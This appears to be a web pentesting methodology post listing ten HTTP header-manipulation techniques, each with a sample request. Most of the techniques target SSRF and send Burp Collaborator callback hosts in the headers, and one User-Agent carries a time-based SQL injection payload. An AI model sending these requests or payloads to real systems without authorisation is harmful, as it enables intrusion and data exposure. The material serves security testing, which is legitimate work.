### My Methodology

#### 1. Overriding the Host Header for SSRF
To test for Server-Side Request Forgery (SSRF), you can attempt to override the `Host` header in an HTTP request. For example:

```http
POST https://company.com
Host: RandomString(10).id.burpcollaborator.net
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
```

#### 2. Spoofing the Original IP with X-Forwarded-For
To expose internal information, you can spoof the original IP address by appending the `X-Forwarded-For` header:

```http
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Forwarded-For: 0000::1
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
```

#### 3. Changing HTTP Version for SSRF
Changing the HTTP version from `HTTP/1.1` to `HTTP/1.0` and using a `X-Forwarded-For` header can also be used to test for SSRF:

```http
GET /Endpoint-To-Proxy HTTP/1.0
Host: www.company.com
X-Forwarded-For: RandomString(10).id.burpcollaborator.net
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
```

#### 4. Using Encoded IP Addresses
You can also use encoded IP addresses in the `X-Forwarded-For` header to expose internal information:

```http
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Forwarded-For: 0177.1
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
```

#### 5. Using Different Headers for SSRF
Using different headers like `X-Forwarded-For`, `X-Forwarded-Host`, `X-Client-IP`, `True-Client-IP`, and `X-Originating-IP` can help in testing for SSRF:

```http
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Forwarded-For: RandomString(10).id.burpcollaborator.net
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
X-Client-IP: RandomString(10).id.burpcollaborator.net
X-Originating-IP: RandomString(10).id.burpcollaborator.net
True-Client-IP: RandomString(10).id.burpcollaborator.net
Connection: keep-alive
```

#### 6. Injecting Non-Standard Headers
Injecting non-standard headers like `X-Remote-User` or `X-ProxyUser-Ip` can also be used to expose internal information:

```http
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Remote-User: admin
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
```

#### 7. Double Standard Headers
Injecting double standard headers like `Referer` and `Origin` can be used to test for SSRF:

```http
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: RandomString(10).id.burpcollaborator.net
Referer: RandomString(10).id.burpcollaborator.net
Origin: https://RandomString(10).id.burpcollaborator.net
Origin: https://RandomString(10).id.burpcollaborator.net
Connection: keep-alive
```

#### 8. Blind XSS and Time-Based SQLi
Injecting payloads into headers like `X-Forwarded-For` or `User-Agent` can be used to test for Blind XSS and Time-Based SQL Injection:

```http
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0'XOR(if(now()=sysdate(),sleep(30),0))OR'
Referer: https://previous.com/path
Origin: https://www.company.com
```

#### 9. Content-Type Header Manipulation
Manipulating the `Content-Type` header can be used to expose internal information or achieve Remote Code Execution (RCE):

```http
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data
Content-Type: application/json
Content-Length: Number
Origin: https://www.company.com
parameter=value
```

#### 10. Cache Poisoning
Manipulating the `Host` and `X-Forwarded-Host` headers can be used to achieve cache poisoning or Cross-Site Scripting (XSS):

```http
GET /Endpoint-To-Proxy HTTP/1.1
Host: company.com:PORT
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
```

By systematically testing these methods, you can identify and mitigate potential security vulnerabilities in your web applications.